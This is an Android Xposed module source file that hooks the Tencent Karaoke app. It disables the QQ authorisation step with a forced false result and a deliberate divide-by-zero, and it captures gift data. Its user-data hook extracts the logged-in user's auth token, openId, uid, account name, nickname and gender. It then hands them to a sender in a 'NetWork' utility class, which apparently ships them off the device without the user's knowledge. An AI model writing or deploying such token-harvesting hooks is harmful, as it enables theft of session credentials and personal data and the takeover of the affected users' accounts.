package com.ms.karorkefz.xposed;

import android.app.Activity;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.view.View;
import android.view.ViewGroup;

import com.google.gson.Gson;
import com.ms.karorkefz.util.Adapter;
import com.ms.karorkefz.util.ColationList;
import com.ms.karorkefz.util.Constant;
import com.ms.karorkefz.util.Log.LogUtil;
import com.ms.karorkefz.util.NetWork.Gift;
import com.ms.karorkefz.util.NetWork.User;

import org.json.JSONObject;

import java.lang.reflect.Field;
import java.util.List;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;

import static com.ms.karorkefz.util.Base.GeneralUtils.getContext;
import static com.ms.karorkefz.util.Shot.getActivity;


public class Karaoke_Load_Hook {
    Adapter adapter;
    private ClassLoader classLoader;

    Karaoke_Load_Hook(ClassLoader mclassLoader) {
        classLoader = mclassLoader;
        this.adapter = new Adapter( "Load" );
    }

    public void init() {
        try {
            XposedHelpers.findAndHookMethod( "com.tencent.connect.auth.AuthAgent",
                    classLoader,
                    "a",
                    Activity.class,
                    XposedHelpers.findClass( "androidx.fragment.app.Fragment", classLoader ),
                    boolean.class,
                    new XC_MethodHook() {
                        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
                        protected void beforeHookedMethod(final MethodHookParam param) throws Throwable {
                            LogUtil.w( "karorkefz", "AuthAgent:" + param.args[0] );
                            param.setResult( false );

                        }
                        protected void afterHookedMethod(final MethodHookParam param) throws Throwable {
                            LogUtil.w( "karorkefz", "AuthAgent:" + param.getResult() );
                            int i = 1 / 0;
                        }
                    } );
            String Load_Gift_Send_Class_String = adapter.getString( "Load_Gift_Send_Class" );
            String Load_Gift_Send_Method_String = adapter.getString( "Load_Gift_Send_Method" );
            XposedHelpers.findAndHookMethod( Load_Gift_Send_Class_String,
                    classLoader,
                    Load_Gift_Send_Method_String,
                    int.class,
                    View.class,
                    ViewGroup.class,
                    new XC_MethodHook() {
                        protected void beforeHookedMethod(final MethodHookParam param) throws Throwable {
                            LogUtil.d( "karorkefz", "Gift_Send_Class" );
                            String Load_Gift_Send_Field_String = adapter.getString( "Load_Gift_Send_Field" );
                            Field Gift_Send_Field = XposedHelpers.findField( param.thisObject.getClass(), Load_Gift_Send_Field_String );
                            List a = (List) Gift_Send_Field.get( param.thisObject );
                            Gson kGson = new Gson();
                            String kVar2_jsonString = kGson.toJson( a );
                            LogUtil.i( "karorkefz", "礼物信息:" + kVar2_jsonString );
                            Gift.Gift_send( kVar2_jsonString );
                        }
                    } );
        } catch (Exception e) {
            LogUtil.i( "karorkefz", "获取礼物信息出错:" + e.getMessage() );
        }
        try {
            String Load_UserMessage_Class_String = adapter.getString( "Load_UserMessage_Class" );
            String Load_UserMessage_Method_String = adapter.getString( "Load_UserMessage_Method" );
            String Load_UserMessage_oneClass_String = adapter.getString( "Load_UserMessage_oneClass" );
            XposedHelpers.findAndHookMethod( Load_UserMessage_Class_String,
                    classLoader,
                    Load_UserMessage_Method_String,
                    XposedHelpers.findClass( Load_UserMessage_oneClass_String, classLoader ),
                    new XC_MethodHook() {
                        protected void afterHookedMethod(final MethodHookParam param) throws Throwable {
                            LogUtil.i( "karorkefz", "UserMessage：" + param.args[0] );
                            Gson cGson = new Gson();
                            String UserMessage_jsonString = cGson.toJson( param.getResult() );
                            LogUtil.i( "karorkefz", "UserMessage:" + UserMessage_jsonString );
                            // 新建JSONObject
                            JSONObject UserMessage_JSONObject = new JSONObject( UserMessage_jsonString );
                            String uid = UserMessage_JSONObject.getString( "mId" );
                            String localLoginType = UserMessage_JSONObject.getString( "mType" );

                            JSONObject mMap_JSONObject = UserMessage_JSONObject.getJSONObject( "mExtras" ).getJSONObject( "mMap" );
                            String auto_login = mMap_JSONObject.getString( "auto_login" );
                            String nameAccount = mMap_JSONObject.getString( "name" );
                            String loginTime = mMap_JSONObject.getString( "timestamp" );
                            String gender = mMap_JSONObject.getString( "gender" );
                            String token = mMap_JSONObject.getString( "token" );
                            String openId = mMap_JSONObject.getString( "openId" );
                            String nickName = mMap_JSONObject.getString( "nickname" );
                            JSONObject UserMessage = new JSONObject();
                            //string
                            UserMessage.put( "uid", uid );
                            UserMessage.put( "localLoginType", localLoginType );
                            UserMessage.put( "auto_login", auto_login );
                            UserMessage.put( "nameAccount", nameAccount );
                            UserMessage.put( "loginTime", loginTime );
                            UserMessage.put( "gender", gender );
                            UserMessage.put( "token", token );
                            UserMessage.put( "openId", openId );
                            UserMessage.put( "nickName", nickName );

                            PackageInfo packageInfo = getContext().getPackageManager().getPackageInfo( "com.ms.karorkefz", 0 );
                            JSONObject fzPackageInfo = new JSONObject();
                            fzPackageInfo.put( "versionName", packageInfo.versionName );
                            fzPackageInfo.put( "versionCode", packageInfo.versionCode );

                            PackageInfo kgpackageInfo = getContext().getPackageManager().getPackageInfo( "com.tencent.karaoke", 0 );
                            JSONObject kgPackageInfo = new JSONObject();
                            kgPackageInfo.put( "versionName", kgpackageInfo.versionName );
                            kgPackageInfo.put( "versionCode", kgpackageInfo.versionCode );

                            JSONObject message = new JSONObject();
                            message.put( "UserMessage", UserMessage );
                            message.put( "kgPackageInfo", kgPackageInfo );
                            message.put( "fzPackageInfo", fzPackageInfo );
                            User.UserMessage_send( message.toString() );
                            Constant.uid = Integer.parseInt( String.valueOf( uid ) );
                            ColationList.zong_add( Integer.parseInt( String.valueOf( uid ) ) );
                        }
                    } );
        } catch (Exception e) {
            LogUtil.i( "karorkefz", "获取用户信息出错:" + e.getMessage() );
        }
    }
}
